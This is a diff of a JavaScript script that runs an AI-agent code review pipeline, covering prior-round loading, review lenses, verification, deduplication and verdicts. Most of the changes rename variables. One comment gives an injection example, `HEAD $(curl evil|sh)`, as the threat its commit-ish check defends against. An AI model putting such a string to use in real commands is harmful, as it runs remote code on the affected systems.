+/** What the detect agent resolved, normalised: the base, the changed files, the spec and the run's identity. @param {DetectAnswer} detectedIn */
+function detectedChange(detectedIn) {
+  const detectedBase = detectedIn.baseRef ?? baseArg
   // DECODED HERE, at the source, before anything asks what a file is. The list comes back as git
   // printed it, and git C-quotes any name holding a space or a non-ASCII character — so the string
   // ends in `"`, `detect` sees no `.rs` suffix, the shared-suffix test sees no `.lock`, and the file
@@ -6171,19 +6161,19 @@ function detectedChange(detected) {
   // pathspec is rendered, was the first attempt and it could never fire: the name had already been
   // filtered out. Normalising once here also corrects which profiles are considered active and which
   // files are reported as covered by none.
-  const changedFiles = (Array.isArray(detected.files) ? detected.files : []).map(decodeGitPath)
+  const detectedFiles = (Array.isArray(detectedIn.files) ? detectedIn.files : []).map(decodeGitPath)
   // The authors' OWN written spec (PR body/title or commit messages) — checked claim-by-claim
   // against the code by the intent lens. The one-line inferred `intent` is not enough: precise
   // claims ("never fails on X", "the only way to Y", "idempotent no-op") live in the full body.
-  const spec = (typeof detected.spec === 'string' ? detected.spec : '').slice(0, 4000)
+  const detectedSpec = (typeof detectedIn.spec === 'string' ? detectedIn.spec : '').slice(0, 4000)
   // The detect agent runs `git rev-parse --abbrev-ref HEAD`, which prints the literal string "HEAD" on
   // a DETACHED HEAD — a non-branch. Route it through the same rule gitIdentity applies (branchFromAbbrevRef,
   // inlined above from lib/run-record.mjs) so a detached run resolves to '' BEFORE this value becomes both
   // the record branch (below) and the prior-round `--branch` flag: a non-empty "HEAD" would pass the
   // no-branch guard and wrongly chain unrelated detached contexts to each other (realm @nick/craft #104).
-  const branch = branchFromAbbrevRef((typeof detected.branch === 'string' ? detected.branch : '').trim())
-  const head = (typeof detected.head === 'string' ? detected.head : '').trim()
-  return { baseRef, changedFiles, spec, branch, head }
+  const detectedBranch = branchFromAbbrevRef((typeof detectedIn.branch === 'string' ? detectedIn.branch : '').trim())
+  const detectedHead = (typeof detectedIn.head === 'string' ? detectedIn.head : '').trim()
+  return { baseRef: detectedBase, changedFiles: detectedFiles, spec: detectedSpec, branch: detectedBranch, head: detectedHead }
 }
 const { baseRef, changedFiles, spec, branch, head } = detectedChange(detected)
 startHead = head
@@ -6210,26 +6200,26 @@ startHead = head
 // The prior round as the loader read it, hardened, with the reason it was not chained when it was not.
 async function loadPriorRound() {
   /** @type {PriorRound | null} */
-  let priorRound = null
+  let loadedPriorRound = null
   // The prior-round lookup's non-found reason, held here because `priorRound` is nulled on a miss below.
   // It is the reason the run did NOT chain to a prior round; null means it DID (reReviewMemory reads null
   // as "chained"). fresh and nested never look up a prior round, so they are their own reasons — not
   // "chained", and not the detached-HEAD footgun either (realm @nick/craft #104).
   /** @type {string | null} */
-  let priorReason = freshArg ? 'fresh' : viaArg ? 'nested' : null
+  let loadedPriorReason = freshArg ? 'fresh' : viaArg ? 'nested' : null
   if (!freshArg && viaArg) {
     log(`Nested run (via ${viaArg}) — the round chain is the top-level run's: not read, and this run's row is not a candidate round for anyone (its siblings in the fan-out share this project and branch)`)
   }
-  if (!freshArg && !viaArg) ({ priorRound, priorReason } = await readPriorRound(priorReason))
-  announcePriorRound(priorRound)
-  return { priorRound, priorReason }
+  if (!freshArg && !viaArg) ({ priorRound: loadedPriorRound, priorReason: loadedPriorReason } = await readPriorRound(loadedPriorReason))
+  announcePriorRound(loadedPriorRound)
+  return { priorRound: loadedPriorRound, priorReason: loadedPriorReason }
 }
-/** @param {string | null} priorReason @returns {Promise<{ priorRound: PriorRound | null, priorReason: string | null }>} */
-async function readPriorRound(priorReason) {
+/** @param {string | null} priorReasonIn @returns {Promise<{ priorRound: PriorRound | null, priorReason: string | null }>} */
+async function readPriorRound(priorReasonIn) {
   // The loader's throw, held apart from its answer so `priorRound` is only ever an answer or null.
   let priorReadThrew = ''
   /** @type {PriorRound | null} */
-  let priorRound = await ragentQuietly(
+  let readRound = await ragentQuietly(
     `You are the craft prior-round loader. This is mechanical IO — you DECIDE nothing: selecting the round, checking ancestry and reading the record are all done by the script.
 
 Run exactly this:
@@ -6244,33 +6234,33 @@ It prints ONE line of JSON and always exits 0. Return that object VERBATIM — c
   // Every rejection has a reason and the reason is LOGGED. Silence here is the exact defect this
   // command replaced: the first re-review of a branch whose rows predate the absolute-path key
   // restarts from a blank ledger, and that must be visible rather than inferred from thin results.
-  if (!priorRound?.['found']) {
-    priorReason = rejectedPriorReason(priorRound, priorReadThrew)
-    priorRound = null
+  if (!readRound?.['found']) {
+    priorReasonIn = rejectedPriorReason(readRound, priorReadThrew)
+    readRound = null
   }
   // Harden the model-authored ledger `head` at the LOAD boundary before it ever reaches a shell
   // command (it is interpolated into the carry/adjudicate `git diff <head>...HEAD`). If it is not a
   // safe commit-ish (a crafted `HEAD $(curl evil|sh)` from a tampered ledger), fall back to the
   // already-resolved base ref rather than nulling priorRound — re-review stays ON, the fix-range diff
   // just widens to base...HEAD. The use sites additionally shq()/flattenField() it (defense in depth).
-  if (priorRound && !isCommitish(priorRound['head'])) {
-    log(`⚠️ prior-round head ${JSON.stringify(priorRound['head'])} is not a safe commit-ish — falling back to the base ref for the fix-range diff`)
-    priorRound['head'] = baseRef
+  if (readRound && !isCommitish(readRound['head'])) {
+    log(`⚠️ prior-round head ${JSON.stringify(readRound['head'])} is not a safe commit-ish — falling back to the base ref for the fix-range diff`)
+    readRound['head'] = baseRef
   }
-  return { priorRound, priorReason }
+  return { priorRound: readRound, priorReason: priorReasonIn }
 }
 // Why there is no prior round, logged; a read that failed (rather than found nothing) is a lost record.
-/** @param {PriorRound | null} priorRound @param {string} priorReadThrew */
-function rejectedPriorReason(priorRound, priorReadThrew) {
+/** @param {PriorRound | null} priorRoundIn @param {string} priorReadThrew */
+function rejectedPriorReason(priorRoundIn, priorReadThrew) {
   // Capture WHY there is no prior round BEFORE `priorRound` is nulled below: the re-review memory
   // outcome (chained? and the detached-HEAD note) is derived from it (realm @nick/craft #104).
-  const priorReason = priorRound?.['reason'] || 'no-prior-round'
-  if (priorRound?.['reason']) log(`No prior round: ${priorRound['reason']}`)
-  notePriorReadFailure(priorRound, priorReadThrew)
-  return priorReason
+  const rejectedReason = priorRoundIn?.['reason'] || 'no-prior-round'
+  if (priorRoundIn?.['reason']) log(`No prior round: ${priorRoundIn['reason']}`)
+  notePriorReadFailure(priorRoundIn, priorReadThrew)
+  return rejectedReason
 }
-/** @param {PriorRound | null} priorRound @param {string} priorReadThrew */
-function notePriorReadFailure(priorRound, priorReadThrew) {
+/** @param {PriorRound | null} priorRoundIn @param {string} priorReadThrew */
+function notePriorReadFailure(priorRoundIn, priorReadThrew) {
   // A read that FAILED is the same lost-record class as a write that failed, and its silence is
   // worse: the run degrades into a first review (thisRound resets to 1, the whole adjudicate/carry
   // track is skipped) and the report cannot be told apart from a genuine first pass.
@@ -6279,18 +6269,18 @@ function notePriorReadFailure(priorRound, priorReadThrew) {
   // "the read could not run". Only the latter is a lost record; marking the former would fire the
   // marker on every first review, which is precisely how a marker stops being read.
   const READ_FAILURES = ['loader-did-not-run', 'git-unavailable']
-  const readFailed = !priorRound || !!priorReadThrew || READ_FAILURES.some(r => String(/** @type {PriorRound} */ (priorRound)['reason'] || '').startsWith(r))
+  const readFailed = !priorRoundIn || !!priorReadThrew || READ_FAILURES.some(r => String(/** @type {PriorRound} */ (priorRoundIn)['reason'] || '').startsWith(r))
   if (readFailed) {
-    noteTelemetryLoss('the prior-round ledger', priorReadThrew || priorRound?.['reason'] || 'the loader agent returned no result')
+    noteTelemetryLoss('the prior-round ledger', priorReadThrew || priorRoundIn?.['reason'] || 'the loader agent returned no result')
   }
 }
-/** @param {PriorRound | null} priorRound */
-function announcePriorRound(priorRound) {
+/** @param {PriorRound | null} priorRoundIn */
+function announcePriorRound(priorRoundIn) {
   // Transport integrity: assert the ledger we received is the ledger the script printed.
-  if (priorRound && ledgerTruncated(priorRound)) {
-    log(`⚠️ prior-round ledger arrived TRUNCATED: the loader printed ${priorRound['ledgerCount']} entr(ies), ${priorRound['ledger']?.length || 0} survived transport — treating the round as degraded and forcing a full re-scan.`)
+  if (priorRoundIn && ledgerTruncated(priorRoundIn)) {
+    log(`⚠️ prior-round ledger arrived TRUNCATED: the loader printed ${priorRoundIn['ledgerCount']} entr(ies), ${priorRoundIn['ledger']?.length || 0} survived transport — treating the round as degraded and forcing a full re-scan.`)
   }
-  if (priorRound) log(`Re-review: prior round ${priorRound['round']} @ ${flattenField(priorRound['head'])} · ${priorRound['ledger']?.length || 0} ledger finding(s)`)
+  if (priorRoundIn) log(`Re-review: prior round ${priorRoundIn['round']} @ ${flattenField(priorRoundIn['head'])} · ${priorRoundIn['ledger']?.length || 0} ledger finding(s)`)
   else log(freshArg ? 'Fresh review (—fresh): prior round ignored' : 'First review for this branch (no prior round)')
 }
 const { priorRound, priorReason } = await loadPriorRound()
@@ -6436,13 +6426,13 @@ const fullRescan = shouldFullRescan({ priorRound, thisRound, fullEvery, degraded
 const lensBase = lensScope()
 // The base the lenses diff against, logged on a re-review with whether this round is a full re-scan.
 function lensScope() {
-  const lensBase = (priorRound && !fullRescan) ? priorRound.head : baseRef
+  const scopeBase = (priorRound && !fullRescan) ? priorRound.head : baseRef
   if (priorRound) {
     log(`Re-review round ${thisRound} lens scope: ${fullRescan
       ? `FULL base...HEAD re-scan (fullEvery=${fullEvery}${priorLedgerDegraded ? ', ledger degraded' : ''}${priorRoundJournalSourced ? ', prior round journal-sourced' : ''}) — earlier misses in untouched code are re-checked`
       : `incremental delta ${flattenField(priorRound['head'])}...HEAD (fix commits only)`}`)
   }
-  return lensBase
+  return scopeBase
 }
 
 // Active profiles: detected in the diff, intersected with any explicit pin. If a pin names a profile
@@ -6809,7 +6799,7 @@ function extraLensesNotRun(reason, needed = true) {
   extraLensOutcome.reached = true
   extraLensOutcome.exit = { reason, needed }
   // Nothing to review (an empty or docs-only diff): a named lens was not needed, which is no gap.
-  if (extraLensRequest.how === 'named' && needed) extraLensOutcome.failed.push(...extraLensRequest.agents.map(agent => ({ agent, why: `not run: ${reason}` })))
+  if (extraLensRequest.how === 'named' && needed) extraLensOutcome.failed.push(...extraLensRequest.agents.map(agentTypeName => ({ agent: agentTypeName, why: `not run: ${reason}` })))
   return extraLensOutcome.failed.map(extraLensGapLine)
 }
 
@@ -6862,9 +6852,9 @@ function verifyPrompt(f, idx, isTool, gateProvenance, profile) {
   const src = sanitizeAttack(f['source'])
   const why = sanitizeAttack(f['why'])
   const exclusionCatalog = exclusionCatalogText(profile)
-  const head = verifyHead(isTool, idx, src)
+  const verifiedHead = verifyHead(isTool, idx, src)
   const at = `${pf.file || '?'}:${f['line'] || 0}`
-  return `${head}
+  return `${verifiedHead}
 
 FINDING: [${pf.severity}] ${pf.title}
   at ${at}
@@ -6979,9 +6969,9 @@ const ROLLUP_MAX = 3
 function rollupPool(pool, profile) {
   const ids = profile.rollupRuleIds || []
   if (!ids.length) return pool
-  const { groups, out } = rollupGroups(pool, ids)
-  for (const [, g] of groups) out.push(...rolledUp(g, profile))
-  return out
+  const { groups, out: rolled } = rollupGroups(pool, ids)
+  for (const [, g] of groups) rolled.push(...rolledUp(g, profile))
+  return rolled
 }
 
 /**
@@ -6991,16 +6981,16 @@ function rollupPool(pool, profile) {
 function rollupGroups(pool, ids) {
   /** @type {Map<string, Finding[]>} */
   const groups = new Map()
-  const out = []
+  const loose = []
   for (const f of pool) {
     const id = f['ruleId'] || ''
-    if (!ids.includes(id)) { out.push(f); continue }
+    if (!ids.includes(id)) { loose.push(f); continue }
     const k = `${f['source'] || ''}::${id}`
     let g = groups.get(k)
     if (!g) { g = []; groups.set(k, g) }
     g.push(f)
   }
-  return { groups, out }
+  return { groups, out: loose }
 }
 
 /** A finding's severity rank, unknown severities last. @param {Finding} f */
@@ -7143,10 +7133,10 @@ async function dedupPool(pool, profile) {
     merged.push(mergedGroup(g.map((/** @type {number} */ i) => /** @type {Finding} */ (pool[i])), isToolSrc))
   }
   if (!merged.length) return pool
-  const out = pool.filter((/** @type {Finding} */ _f, /** @type {number} */ i) => !inGroup.has(i)).concat(merged)
+  const foldedPool = pool.filter((/** @type {Finding} */ _f, /** @type {number} */ i) => !inGroup.has(i)).concat(merged)
   const detFolded = detGroups.reduce((n, g) => n + g.length - 1, 0)
-  log(`[${profile.id}] Dedup before verify: ${pool.length} → ${out.length} (${pool.length - out.length} cross-lens duplicate(s) merged — ${detFolded} of them same-spot, caught deterministically)`)
-  return out
+  log(`[${profile.id}] Dedup before verify: ${pool.length} → ${foldedPool.length} (${pool.length - foldedPool.length} cross-lens duplicate(s) merged — ${detFolded} of them same-spot, caught deterministically)`)
+  return foldedPool
 }
 
 // Verify a pool of findings → {confirmed, suspected, dropped, refuted}. Rigor scales with the profile's plan.
@@ -7508,7 +7498,7 @@ async function verifyPool(items, plan, profile, gateProvenance) {
   // made the two indistinguishable in the report AND put them in the refuteRate denominator, so a run
   // whose findings were mostly Low/Info reported a refutation rate diluted by items nothing refuted.
   /** @type {Finding[]} */
-  const unverified = route.skip.map(f => ({
+  const routedUnverified = route.skip.map(f => ({
     ...f,
     tier: 'unverified',
     why: lightPass ? `${f['why']} (NOT VERIFIED: ${lightUnverifiedWhy(f['severity'])})` : `${f['why']} (NOT VERIFIED: no verifier was spent on it — ${f['severity']} cannot change the verdict either way, so nothing here has been checked against the code)`,
@@ -7685,7 +7675,7 @@ async function verifyPool(items, plan, profile, gateProvenance) {
     suspected: vp.filter(f => f.tier === 'suspected'),
     // Kept OUT of `vp` on purpose, from both of its sources: the Low/Info nothing was spent on, and
     // the groups whose batch verifier died.
-    unverified: unverified.concat(deaths),
+    unverified: routedUnverified.concat(deaths),
     // DERIVED from the tier, not pushed by whichever branch remembered to. Grouped by file and
     // ranked-friendly: one stable string per (profile, file), no error text, no run-specific path.
     // THE ONE THINNING THAT LEAVES NO TRACE. A refuted finding is deleted from the run — out of
@@ -8181,7 +8171,7 @@ async function reviewProfile(profile) {
   const pool = []
   // A gate seed is round 0 of the lens-round yield (lib/lens-round-yield.mjs).
   for (const f of seedFindings) { const k = key(f); if (!seen.has(k)) { seen.add(k); pool.push({ ...f, foundInRound: 0 }) } }
-  const notRun = [...scoutNotRun]
+  const profileNotRun = [...scoutNotRun]
   // ONE coverage ledger, counted over DISPATCHES. There used to be a second, `ranAtLeastOnce`, and
   // after the dispatch accounting landed it was written twice and read nowhere — dead state whose
   // comment still claimed a role, which is how a reader comes to believe there are two ledgers that
@@ -8231,14 +8221,14 @@ async function reviewProfile(profile) {
       LENS_WINDOW_AGENTS,
       (run, i) => run().then(r => (r ? { ...r, __key: dispatchKey(/** @type {(typeof dispatches)[number]} */ (dispatches[i]).lens, /** @type {(typeof dispatches)[number]} */ (dispatches[i]).slice), __lens: /** @type {(typeof dispatches)[number]} */ (dispatches[i]).lens } : null)),
     )
-    const results = settled.filter(r => r != null)
+    const landedResults = settled.filter(r => r != null)
     // `__lens`, not the model's `lens` field. Coverage already avoided trusting it; the finding's
     // `source` and the ran-set did not, and a dispatch answering with a mangled name sent its
     // findings to `source: 'unknown'` while its dimension row read `ran: true` with zero findings —
     // the yield inversion `ranLenses` exists to prevent, arriving one field over.
-    for (const r of results) returnedDispatches.add(r.__key)
+    for (const r of landedResults) returnedDispatches.add(r.__key)
     const fresh = []
-    for (const r of results) {
+    for (const r of landedResults) {
       for (const f0 of (r.findings || [])) {
         const f = { ...f0, source: r.__lens, foundInRound: round }
         const k = key(f)
@@ -8267,7 +8257,7 @@ async function reviewProfile(profile) {
     // longer the lens count. Left as `plan.lenses.length` it undercounted, so `returned` could
     // exceed it and any death accounting downstream read inverted — and this is the field that
     // makes a lost slice visible in the record at all.
-    lensRounds.push({ round, agents: dispatches.length, returned: results.length, newFindings: fresh.length })
+    lensRounds.push({ round, agents: dispatches.length, returned: landedResults.length, newFindings: fresh.length })
     log(`[${profile.id}] Lenses round ${round}: +${fresh.length} new (pool ${pool.length})`)
     return !fresh.length
   }
@@ -8277,7 +8267,7 @@ async function reviewProfile(profile) {
   let dry = false
   for (let round = 1; round <= plan.maxRounds && !dry; round++) dry = await lensRound(round)
   pushUnseen(await extraFindings, seen, pool)
-  notRun.push(...extraLensGaps(profile))
+  profileNotRun.push(...extraLensGaps(profile))
 
   // ---- Resurrection sweep ----
   // A lens agent occasionally returns null on a transient API death / connection drop. That
@@ -8319,8 +8309,8 @@ async function reviewProfile(profile) {
         runLens(a.lens, lensPrompt(a.lens, priorSummary, profile, plan), 'Lenses', ` resurrect${sweep}`)
           .then(r => (r ? { ...r, __lens: a.lens } : null)),
       ))
-      const results = settled.filter(r => r != null)
-      for (const r of results) absorbResurrected(r)
+      const resurrected = settled.filter(r => r != null)
+      for (const r of resurrected) absorbResurrected(r)
       missing = lensesWithHoles()
     }
   }
@@ -8332,18 +8322,18 @@ async function reviewProfile(profile) {
   // diff got no safety review.
   // The dispatches that never returned, each with its reason, carried into notRun and the log.
   function reportDroppedLenses() {
-    const droppedLenses = [...expectedDispatches].filter(k => !returnedDispatches.has(k))
-    if (droppedLenses.length) {
+    const neverReturned = [...expectedDispatches].filter(k => !returnedDispatches.has(k))
+    if (neverReturned.length) {
       // Falls back to the BARE lens name, because the resurrection sweep dispatches unsliced and can
       // only key its failure that way. Without the fallback every sliced hole read "died without an
       // error" even when the retry died with a captured message — losing the diagnosis for exactly
       // the sliced case, which is what keying by dispatch was introduced to fix.
       const reasonFor = (/** @type {string} */ k) => lensFailures.get(k) || lensFailures.get(k.split(' :: ')[0] ?? k) || 'returned no result (skipped or died without an error)'
-      const reasons = droppedLenses.map(k => `${k}: ${reasonFor(k)}`).join(' · ')
-      notRun.push(`${profile.id} lenses that never returned — ${reasons}`)
-      log(`⚠️ [${profile.id}] ${droppedLenses.length} lens dispatch(es) never returned (${reasons}). Review marked INCOMPLETE.`)
+      const reasons = neverReturned.map(k => `${k}: ${reasonFor(k)}`).join(' · ')
+      profileNotRun.push(`${profile.id} lenses that never returned — ${reasons}`)
+      log(`⚠️ [${profile.id}] ${neverReturned.length} lens dispatch(es) never returned (${reasons}). Review marked INCOMPLETE.`)
     }
-    return droppedLenses
+    return neverReturned
   }
   const droppedLenses = reportDroppedLenses()
   // `ranLenses` rides along to the record: the dimension rows are built from plan.lenses, so a lens
@@ -8365,27 +8355,27 @@ async function reviewProfile(profile) {
     language: profile.id, branch, head, baseRef, round: thisRound, ranLenses, droppedLenses, lensRounds,
     candidates: summarizeFindings(pool),
     candidatesBySource: pool.reduce((m, f) => ({ ...m, [f.source || 'unknown']: (m[f.source || 'unknown'] || 0) + 1 }), /** @type {Record<string, number>} */ ({})),
-    notRun,
+    notRun: profileNotRun,
   }, 'Lenses')
   if (!pool.length) {
-    return { profile, plan, surfaceDropped, optionalScope, ranLenses, lensRounds, gateStatus, gateProvenance, failedChecks, carriedChecks, confirmed: [], suspected: [], unverified: [], dropped: 0, notRun, criticNotes: '', probeViolations }
+    return { profile, plan, surfaceDropped, optionalScope, ranLenses, lensRounds, gateStatus, gateProvenance, failedChecks, carriedChecks, confirmed: [], suspected: [], unverified: [], dropped: 0, notRun: profileNotRun, criticNotes: '', probeViolations }
   }
 
   // ---- Verify ----
   phase('Verify')
   const deduped = await dedupPool(rollupPool(applyPathFloor(pool), profile), profile)
-  let { confirmed, suspected, unverified, dropped, refuted, notRun: verifyNotRun, savedByFloor } = await verifyPool(deduped, plan, profile, toolProvenance)
+  let { confirmed: profileConfirmed, suspected: profileSuspected, unverified: profileUnverified, dropped: profileDropped, refuted, notRun: verifyNotRun, savedByFloor: profileSavedByFloor } = await verifyPool(deduped, plan, profile, toolProvenance)
   // Verification that never ran joins the lens-level list: a dead batch verifier is a hole in
   // coverage exactly like a lens that never returned, and both must reach the verdict as INCOMPLETE.
-  notRun.push(...verifyNotRun)
-  log(`[${profile.id}] Verify: ${confirmed.length} confirmed · ${suspected.length} suspected · ${dropped} refuted · ${unverified.length} not verified`)
+  profileNotRun.push(...verifyNotRun)
+  log(`[${profile.id}] Verify: ${profileConfirmed.length} confirmed · ${profileSuspected.length} suspected · ${profileDropped} refuted · ${profileUnverified.length} not verified`)
   await checkpoint(`${profile.id}-verify`, {
     language: profile.id, branch, head, baseRef, round: thisRound,
-    verdict: honestVerdict(finalVerdict(confirmed), notRun),
-    findings: summarizeFindings(confirmed),
+    verdict: honestVerdict(finalVerdict(profileConfirmed), profileNotRun),
+    findings: summarizeFindings(profileConfirmed),
     // `candidates` counts what verification EXAMINED, so the unverified tier is reported beside it
     // rather than inside it.
-    verification: { candidates: deduped.length - unverified.length, confirmed: confirmed.length, suspected: suspected.length, refuted: dropped, unverified: unverified.length },
+    verification: { candidates: deduped.length - profileUnverified.length, confirmed: profileConfirmed.length, suspected: profileSuspected.length, refuted: profileDropped, unverified: profileUnverified.length },
   }, 'Verify')
 
   // ---- Completeness critic (large or security-sensitive; budget-gated) ----
@@ -8398,7 +8388,7 @@ async function reviewProfile(profile) {
     if (criticInScope && (!budget.total || budget.remaining() > 90000)) {
       await runCritic()
     } else if (criticInScope) {
-      notRun.push(`${profile.id} completeness-critic`)
+      profileNotRun.push(`${profile.id} completeness-critic`)
       log(`Budget low (~${Math.round(budget.remaining() / 1000)}k left) — SKIPPED [${profile.id}] completeness critic. Review marked INCOMPLETE.`)
     }
   }
@@ -8406,12 +8396,12 @@ async function reviewProfile(profile) {
     const candidates = profile.lenses.filter((/** @type {string} */ l) => !plan.lenses.includes(l))
     const critic = await ragent(
       `You are a completeness critic for a ${profile.lang} review of the diff (base ${flattenField(baseRef) || 'HEAD'}).
-Lenses already run: ${plan.lenses.join(', ')}. Confirmed: ${confirmed.length}, Suspected: ${suspected.length}.
+Lenses already run: ${plan.lenses.join(', ')}. Confirmed: ${profileConfirmed.length}, Suspected: ${profileSuspected.length}.
 Name any review lens that was NOT run but SHOULD be, given what the diff touches — choose ONLY from: ${JSON.stringify(candidates)}.
 Also note in one line anything else likely missed (a changed file no finding touched, a claim left unverified). If coverage is complete, return missingLenses: [] and notes: "coverage complete".`,
       { label: `critic:${profile.id}`, phase: 'Synthesize', schema: CRITIC_SCHEMA, effort: 'low' },
     )
-    criticNotes = critic?.notes ?? ''
+    profileCriticNotes = critic?.notes ?? ''
     // `admittedLens()` gates HERE too, and this is the fourth road into the plan, not a redundant check:
     // `candidates` is by construction the lenses NOT selected, so the whole optional set is in it.
     // The critic is the same model whose hands this project deliberately took the spend out of
@@ -8423,7 +8413,7 @@ Also note in one line anything else likely missed (a changed file no finding tou
     if (followups.length && (!budget.total || budget.remaining() > 60000)) {
       await criticFollowups(followups)
     } else if (followups.length) {
-      notRun.push(`${profile.id} critic follow-up lenses (${followups.join('/')})`)
+      profileNotRun.push(`${profile.id} critic follow-up lenses (${followups.join('/')})`)
       log(`Budget low (~${Math.round(budget.remaining() / 1000)}k left) — SKIPPED [${profile.id}] critic follow-up lenses. Review marked INCOMPLETE.`)
     }
   }
@@ -8460,7 +8450,7 @@ Also note in one line anything else likely missed (a changed file no finding tou
     ))
     const deadFollowups = followups.filter((/** @type {string} */ _l, /** @type {number} */ i) => !settledExtra[i])
     if (deadFollowups.length) {
-      notRun.push(...deadFollowups.map((/** @type {string} */ l) => `${profile.id} critic follow-up lens ${l} — dispatched and returned no findings (died, or answered off-schema)`))
+      profileNotRun.push(...deadFollowups.map((/** @type {string} */ l) => `${profile.id} critic follow-up lens ${l} — dispatched and returned no findings (died, or answered off-schema)`))
       log(`⚠️ [${profile.id}] critic follow-up lens(es) ${deadFollowups.join('/')} died before returning findings — recorded as not run; the review is INCOMPLETE`)
     }
     // `source` is the lens the engine dispatched, never the model's own label: the severity floor
@@ -8469,20 +8459,20 @@ Also note in one line anything else likely missed (a changed file no finding tou
     const fresh = extra.filter(f => { const k = key(f); if (seen.has(k)) return false; seen.add(k); return true })
     if (fresh.length) {
       const v = await verifyPool(await dedupPool(applyPathFloor(fresh), profile), plan, profile, toolProvenance)
-      notRun.push(...(v.notRun || []))
-      savedByFloor = savedByFloor.concat(v.savedByFloor || [])
-      confirmed = confirmed.concat(v.confirmed)
-      suspected = suspected.concat(v.suspected)
-      unverified = unverified.concat(v.unverified)
-      dropped += v.dropped
+      profileNotRun.push(...(v.notRun || []))
+      profileSavedByFloor = profileSavedByFloor.concat(v.savedByFloor || [])
+      profileConfirmed = profileConfirmed.concat(v.confirmed)
+      profileSuspected = profileSuspected.concat(v.suspected)
+      profileUnverified = profileUnverified.concat(v.unverified)
+      profileDropped += v.dropped
       refuted = refuted.concat(v.refuted)
       log(`[${profile.id}] Critic follow-up: +${v.confirmed.length} confirmed · +${v.suspected.length} suspected · ${v.dropped} refuted · +${v.unverified.length} not verified`)
     }
   }
-  let criticNotes = ''
+  let profileCriticNotes = ''
   await completenessCritic()
 
-  return { profile, plan, surfaceDropped, optionalScope, ranLenses, lensRounds, criticFollowupLenses, gateStatus, gateProvenance, failedChecks, carriedChecks, confirmed, suspected, unverified, dropped, refuted, notRun, savedByFloor, criticNotes, probeViolations }
+  return { profile, plan, surfaceDropped, optionalScope, ranLenses, lensRounds, criticFollowupLenses, gateStatus, gateProvenance, failedChecks, carriedChecks, confirmed: profileConfirmed, suspected: profileSuspected, unverified: profileUnverified, dropped: profileDropped, refuted, notRun: profileNotRun, savedByFloor: profileSavedByFloor, criticNotes: profileCriticNotes, probeViolations }
 }
 
 // ================= Run each active profile, then merge =================
@@ -8629,8 +8619,8 @@ const adjudicated = { resolved: [], stillOpen: [], regressed: [], carried: [], r
 // a lost tombstone is caught by the same ledgerCount check every other row is.
 /** @type {LedgerAnswer[]} */
 const priorTombstones = []
-/** Priors carrying the unverified tier re-enter this round's unverified track. @param {Finding[]} priorUnverified @param {PriorRound} priorRound */
-function carryUnverifiedPriors(priorUnverified, priorRound) {
+/** Priors carrying the unverified tier re-enter this round's unverified track. @param {Finding[]} priorUnverified @param {PriorRound} priorRoundIn */
+function carryUnverifiedPriors(priorUnverified, priorRoundIn) {
   if (priorUnverified.length) {
     log(`${priorUnverified.length} prior finding(s) carry the unverified tier — never checked against the code, so nothing to adjudicate: carried forward as unverified rather than promoted to still-open`)
     unverified = unverified.concat(priorUnverified.map((/** @type {Finding} */ f) => ({
@@ -8642,7 +8632,7 @@ function carryUnverifiedPriors(priorUnverified, priorRound) {
       // they were never adjudicated — so without the flag a fresh unverified re-discovery of the
       // same site is neither marked nor collapsed, and the site gains a ledger row every round.
       carriedUnverified: true,
-      why: `${baseWhy(f['why'])} (STILL NOT VERIFIED: carried from round ${priorRound['round']}, where no verifier judged it; nothing has checked it against the code since)`,
+      why: `${baseWhy(f['why'])} (STILL NOT VERIFIED: carried from round ${priorRoundIn['round']}, where no verifier judged it; nothing has checked it against the code since)`,
     })))
   }
 }
@@ -8789,11 +8779,11 @@ Return {defeated, attack} — defeated=true ONLY with a concrete attack that sur
       // transient agent death must not spuriously reopen findings. But the degradation must be
       // auditable — count it, log it, and annotate the note so "red-team passed" is distinguishable
       // from "red-team never ran" in the report and the run log.
-      const { adj: out, died, overturned: ov, invalid } = classifyRedTeam(f, adj, rt)
+      const { adj: redTeamed, died, overturned: ov, invalid } = classifyRedTeam(f, adj, rt)
       if (died) { redTeamDied++; log(`⚠️ red-team for ${f['file']}:${f['line']} died — "resolved" stands on the adjudicator's own attack pass only`) }
       if (invalid) { invalidRedTeam++; log(`⚠️ red-team for ${f['file']}:${f['line']} claimed defeat with NO attack — invalid verdict discarded, keeping resolved`) }
       if (ov) overturned++
-      return out
+      return redTeamed
     }
     const checkResults = (await parallel(toCheck.map((/** @type {Finding} */ f) => () => {
       const pf = promptFields(f)
@@ -9342,16 +9332,16 @@ const allReviewFindings = confirmed.concat(suspected, unverified)
 const totalVerified = confirmed.length + suspected.length + dropped + priorRejected.filter(f => f.priorTier !== 'unverified').length - priorRejectedLive
 /** The verdict the record carries: the re-review tracks or the confirmed set, escalated by strict maintainability. */
 function decideRecordVerdict() {
-  let recordVerdict = isRereview
+  let decided = isRereview
     ? rereviewVerdict({ stillOpen: adjudicated.stillOpen, regressed: adjudicated.regressed, neu: confirmed })
     : finalVerdict(confirmed)
   // Strict-mode maintainability escalation applies to a re-review too (finalVerdict already covers the
   // first-pass path): a Confirmed Medium+ maintainability finding among the live re-review set blocks.
   if (isRereview && strict && [...adjudicated.stillOpen, ...adjudicated.regressed, ...confirmed]
     .some(f => isMaintainability(f) && (f.severity === 'Critical' || f.severity === 'High' || f.severity === 'Medium'))) {
-    recordVerdict = 'Block'
+    decided = 'Block'
   }
-  return recordVerdict
+  return decided
 }
 const recordVerdict = decideRecordVerdict()
 // THE PREMISE OF THE SAVING, CHECKED AGAINST THE VERDICT THAT ACTUALLY CAME OUT. Skipping a Medium
@@ -9628,9 +9618,9 @@ function fallbackRereviewTracks(bySev, fmt) {
 function markVerdictIncomplete(text) {
   if (floorPremiseHeld) return text
   const lines = String(text).split('\n')
-  const head = lines.findIndex(l => /^#+\s*Verdict\b/i.test(l.trim()))
-  if (head < 0) return text
-  const at = lines.findIndex((l, i) => i > head && l.trim())
+  const headingAt = lines.findIndex(l => /^#+\s*Verdict\b/i.test(l.trim()))
+  if (headingAt < 0) return text
+  const at = lines.findIndex((l, i) => i > headingAt && l.trim())
   if (at < 0 || /INCOMPLETE/.test(/** @type {string} */ (lines[at]))) return text
   lines[at] = `${lines[at]} · ⚠️ INCOMPLETE — ${savedByFloor.length} verification(s) were skipped because the verdict stood at Block, and the run did not end at Block; those findings are unverified for a reason that did not apply.`
   return lines.join('\n')
